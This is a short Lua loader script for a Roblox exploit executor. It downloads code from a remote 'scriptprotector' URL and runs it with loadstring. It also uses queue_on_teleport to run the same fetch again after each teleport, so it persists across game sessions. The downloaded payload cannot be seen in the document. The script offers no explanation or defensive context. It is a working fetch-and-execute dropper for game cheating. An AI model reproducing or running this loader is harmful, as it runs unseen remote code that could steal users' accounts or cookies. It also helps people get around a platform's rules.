if getgenv().AlreadyExecutedtozx then return end

getgenv().AlreadyExecutedtozx = true

local target_url = "https://scriptprotector.vercel.app/api/raw/1de6809f33044a4f124bd252680c0b8a"

task.spawn(function()

    local queue_on_teleport = (syn and syn.queue_on_teleport) or queue_on_teleport or queueonteleport

    if queue_on_teleport then

        pcall(function()

            queue_on_teleport('loadstring(game:HttpGet("' .. target_url .. '"))()')

        end)

    end

end)

pcall(function()

    loadstring(game:HttpGet(target_url))()

end)
